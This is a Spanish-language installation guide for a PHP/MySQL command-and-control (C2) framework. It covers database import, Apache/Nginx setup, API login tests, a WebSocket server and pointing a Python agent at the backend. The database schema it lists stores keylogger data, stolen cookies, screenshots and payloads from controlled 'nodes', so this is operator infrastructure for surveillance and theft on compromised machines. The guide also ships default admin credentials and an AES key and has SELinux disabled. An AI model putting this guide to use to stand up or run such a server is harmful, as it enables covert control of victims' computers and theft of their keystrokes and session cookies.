# 🚀 Instalación C2 Framework - PHP + MySQL

## 📋 Requisitos Previos

### Software Necesario
- PHP 7.4+ (recomendado 8.0+)
- MySQL 8.0+ o MariaDB 10.5+
- Apache 2.4+ o Nginx
- Composer (opcional, para dependencias)
- Git

### Extensiones PHP Requeridas
```bash
php -m | grep -E 'pdo|mysqli|openssl|json|mbstring'
```

Debe mostrar:
- pdo_mysql
- mysqli
- openssl
- json
- mbstring

---

## 📦 PASO 1: Instalar Base de Datos

### Opción A: Línea de Comandos

```bash
# Conectar a MySQL
mysql -u root -p

# Ejecutar script SQL
mysql -u root -p < /app/database.sql
```

### Opción B: phpMyAdmin

1. Acceder a phpMyAdmin
2. Click en "Importar"
3. Seleccionar archivo `/app/database.sql`
4. Click "Ejecutar"

### Verificar Instalación

```sql
USE c2_framework;
SHOW TABLES;
```

Debe mostrar 11 tablas:
- users
- nodes
- commands
- audit_logs
- screenshots
- keylogger_data
- cookies
- files
- sessions
- payloads
- websocket_connections

---

## ⚙️ PASO 2: Configurar Backend PHP

### 2.1 Copiar Archivos

```bash
# Copiar backend PHP al servidor web
sudo cp -r /app/php-backend /var/www/html/c2-api
sudo chown -R www-data:www-data /var/www/html/c2-api
sudo chmod -R 755 /app/php-backend
```

### 2.2 Configurar Base de Datos

Editar `/app/php-backend/config/database.php`:

```php
private $host = 'localhost';
private $db_name = 'c2_framework';
private $username = 'c2_app';
private $password = 'C2SecurePassword123!';  // CAMBIAR EN PRODUCCIÓN
```

### 2.3 Configurar Aplicación

Editar `/app/php-backend/config/config.php`:

```php
define('SECRET_KEY', 'CAMBIAR-ESTE-SECRET-KEY');
define('AES_KEY', 'ba4gd0qnveoxHglI4OL8n0jRAteGLexoWN2FbOH2zsU=');
define('ALLOWED_ORIGINS', '*'); // En producción: 'https://tu-dominio.com'
```

---

## 🌐 PASO 3: Configurar Servidor Web

### Opción A: Apache

Crear `/etc/apache2/sites-available/c2-framework.conf`:

```apache
<VirtualHost *:80>
    ServerName c2.local
    DocumentRoot /var/www/html/c2-api
    
    <Directory /var/www/html/c2-api>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
        
        # Enable mod_rewrite
        RewriteEngine On
        RewriteBase /
        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteCond %{REQUEST_FILENAME} !-d
        RewriteRule ^api/(.*)$ /index.php [QSA,L]
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/c2_error.log
    CustomLog ${APACHE_LOG_DIR}/c2_access.log combined
</VirtualHost>
```

Activar sitio:
```bash
sudo a2ensite c2-framework
sudo a2enmod rewrite
sudo systemctl restart apache2
```

### Opción B: Nginx

Crear `/etc/nginx/sites-available/c2-framework`:

```nginx
server {
    listen 80;
    server_name c2.local;
    root /var/www/html/c2-api;
    index index.php;

    location /api/ {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location ~ /\.ht {
        deny all;
    }
}
```

Activar sitio:
```bash
sudo ln -s /etc/nginx/sites-available/c2-framework /etc/nginx/sites-enabled/
sudo systemctl restart nginx
```

---

## 🔐 PASO 4: Permisos y Seguridad

### 4.1 Permisos de Directorios

```bash
# Crear directorios necesarios
sudo mkdir -p /app/payloads
sudo mkdir -p /app/screenshots
sudo mkdir -p /app/logs

# Asignar permisos
sudo chown www-data:www-data /app/payloads
sudo chown www-data:www-data /app/screenshots
sudo chown www-data:www-data /app/logs
sudo chmod 755 /app/payloads
sudo chmod 755 /app/screenshots
sudo chmod 755 /app/logs
```

### 4.2 SELinux (si está activo)

```bash
# Verificar SELinux
getenforce

# Si está en Enforcing
sudo setenforce 0  # Temporal
# O configurar políticas específicas
```

---

## 🧪 PASO 5: Probar Instalación

### Test 1: API Root

```bash
curl http://localhost/api/
```

**Respuesta esperada:**
```json
{
  "message": "C2 Framework API",
  "status": "operational",
  "version": "2.0.0",
  "backend": "PHP/MySQL"
}
```

### Test 2: Autenticación

```bash
curl -X POST http://localhost/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"c2admin123"}'
```

**Respuesta esperada:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "token_type": "bearer"
}
```

### Test 3: Listar Nodos (con token)

```bash
TOKEN="<tu_token_aqui>"
curl http://localhost/api/nodes \
  -H "Authorization: Bearer $TOKEN"
```

---

## 🎨 PASO 6: Configurar Frontend

### Opción A: Mantener React Frontend

Editar `/app/frontend/.env`:

```env
REACT_APP_BACKEND_URL=http://localhost
```

Reiniciar frontend:
```bash
sudo supervisorctl restart frontend
```

### Opción B: Crear Frontend PHP

Crear `/var/www/html/c2-panel/index.php`:

```php
<?php
// Ver archivo completo en FRONTEND_PHP.md
?>
```

---

## 📱 PASO 7: Actualizar Agente Python

El agente Python debe apuntar al nuevo backend PHP:

Editar `/app/agent_advanced.py`:

```python
API_SERVER = "http://localhost/api"
```

**NOTA**: El agente funciona igual con backend PHP o Python.

---

## ✅ VERIFICACIÓN COMPLETA

### Checklist de Instalación

- [ ] MySQL instalado y corriendo
- [ ] Base de datos `c2_framework` creada
- [ ] Tablas importadas correctamente
- [ ] Usuario `c2_app` creado
- [ ] PHP >= 7.4 instalado
- [ ] Extensiones PHP activadas
- [ ] Backend PHP copiado
- [ ] Configuración editada
- [ ] Servidor web configurado
- [ ] Permisos asignados
- [ ] API responde en `/api/`
- [ ] Login funciona
- [ ] Token JWT válido

### Script de Verificación

```bash
bash /app/test_php_installation.sh
```

---

## 🔧 Configuración Avanzada

### WebSocket Server (Opcional)

Para WebSocket en PHP, instalar Ratchet:

```bash
cd /app/php-backend
composer require cboden/ratchet
```

Crear `/app/php-backend/websocket/server.php`:

```php
<?php
require __DIR__ . '/../vendor/autoload.php';

use Ratchet\Server\IoServer;
use Ratchet\Http\HttpServer;
use Ratchet\WebSocket\WsServer;
use MyApp\C2WebSocket;

$server = IoServer::factory(
    new HttpServer(
        new WsServer(
            new C2WebSocket()
        )
    ),
    8080
);

$server->run();
```

Ejecutar:
```bash
php /app/php-backend/websocket/server.php &
```

---

## 📊 Monitoreo y Logs

### Logs de Apache

```bash
# Errores
tail -f /var/log/apache2/c2_error.log

# Accesos
tail -f /var/log/apache2/c2_access.log
```

### Logs de MySQL

```bash
# Queries lentas
tail -f /var/log/mysql/slow-query.log

# Errores
tail -f /var/log/mysql/error.log
```

### Logs de PHP

```bash
# Ver errores PHP
tail -f /var/log/php/error.log
```

---

## 🔄 Migración de Python a PHP

### Datos Existentes

Si tienes datos en MongoDB del sistema anterior:

```bash
# Exportar de MongoDB
mongoexport --db c2_framework --collection nodes --out nodes.json

# Importar a MySQL (crear script)
php /app/migrate_mongodb_to_mysql.php
```

---

## 🐛 Troubleshooting

### Error: "Connection failed"

```bash
# Verificar MySQL
sudo systemctl status mysql

# Probar conexión
mysql -u c2_app -p c2_framework
```

### Error: "404 Not Found"

```bash
# Verificar mod_rewrite (Apache)
sudo a2enmod rewrite
sudo systemctl restart apache2

# Verificar .htaccess existe
ls -la /var/www/html/c2-api/.htaccess
```

### Error: "Permission denied"

```bash
# Verificar permisos
ls -la /var/www/html/c2-api
sudo chown -R www-data:www-data /var/www/html/c2-api
```

### Error: "PDO extension not found"

```bash
# Instalar extensión
sudo apt-get install php-mysql
sudo systemctl restart apache2
```

---

## 🔐 Seguridad en Producción

### 1. Cambiar Credenciales

```sql
-- Cambiar password de usuario MySQL
ALTER USER 'c2_app'@'localhost' IDENTIFIED BY 'NewSecurePassword!';

-- Cambiar password de admin
UPDATE users SET password = '$2y$10$nuevo_hash' WHERE username = 'admin';
```

### 2. HTTPS Obligatorio

```apache
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem
    ...
</VirtualHost>
```

### 3. Firewall

```bash
# Permitir solo HTTP/HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

### 4. Deshabilitar Errores PHP

En `/app/php-backend/config/config.php`:

```php
error_reporting(0);
ini_set('display_errors', 0);
```

---

## 📚 Archivos de Configuración

### Estructura Final

```
/var/www/html/c2-api/
├── config/
│   ├── database.php
│   └── config.php
├── controllers/
├── models/
│   ├── Node.php
│   ├── Command.php
│   └── AuditLog.php
├── middleware/
│   └── Auth.php
├── utils/
│   ├── JWT.php
│   └── Encryption.php
├── websocket/
│   └── server.php
├── index.php
└── .htaccess
```

---

## 🎉 ¡Instalación Completa!

Tu C2 Framework PHP + MySQL está listo:

**Panel de Control:**
- URL: `http://localhost:3000` (React)
- O: `http://localhost/panel` (PHP)

**API Backend:**
- URL: `http://localhost/api/`
- Docs: `http://localhost/api/docs`

**Credenciales:**
- Usuario: `admin`
- Password: `c2admin123`

---

## 📞 Soporte

Para problemas:
1. Ver logs: `tail -f /var/log/apache2/c2_error.log`
2. Verificar MySQL: `mysql -u c2_app -p`
3. Probar API: `curl http://localhost/api/`

---

🛡️ **Sistema C2 PHP/MySQL - Profesional y Escalable**
